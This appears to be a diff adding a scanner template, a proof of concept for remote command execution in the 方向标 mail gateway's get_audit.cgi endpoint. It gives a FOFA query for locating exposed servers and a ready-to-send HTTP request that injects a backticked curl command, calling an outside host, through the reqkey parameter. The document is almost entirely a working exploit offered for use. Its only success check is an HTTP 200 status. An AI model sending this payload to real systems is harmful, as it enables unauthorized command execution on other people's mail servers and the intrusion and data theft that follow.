@@ -1,0 +1,33 @@
+id: poc-laqdaotqde7ql59t
+info:
+  name: 方向标邮件网关 get_audit.cgi 存在远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/laqdaotqde7ql59t'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: laqdaotqde7ql59t
+    fofa: header="fm_chk_cookie_ok"
+http:
+- raw:
+  - 'GET /common/cgi/get_audit.cgi?_mode=get_raw_file&reqkey=;`curl+lwdjdkcqdn.lfcx.eu.org` HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Upgrade-Insecure-Requests: 1
+
+    Priority: u=0, i
+
+    Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+
+    Accept-Encoding: gzip, deflate'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
